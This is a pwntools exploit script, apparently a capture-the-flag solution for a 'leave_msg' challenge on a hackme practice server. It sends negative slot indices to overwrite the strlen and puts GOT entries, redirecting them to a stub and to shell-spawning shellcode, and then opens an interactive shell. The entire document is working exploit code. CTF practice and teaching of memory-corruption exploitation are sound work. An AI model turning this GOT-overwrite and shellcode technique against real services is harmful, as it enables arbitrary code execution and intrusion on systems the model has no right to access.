from pwn import *
context.log_level = 'debug'
context(arch = 'i386')
#p = process('leave_msg',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
p = remote('hackme.inndy.tw',7715)

#hijack strlen_got --> xor eax,eax ; ret
p.recvuntil('message:\n')
#gdb.attach(p,"b *" + str(0x0804861D))
payload = asm('xor eax,eax ; ret')
p.send(payload)
p.recvuntil('slot?\n')
p.send(' -15')

#hijack puts_got --> shellcode
p.recvuntil('message:\n')
shellcode = asm(shellcraft.sh())
p.send(shellcode)
p.recvuntil('slot?\n')
p.send(' -16')

p.interactive()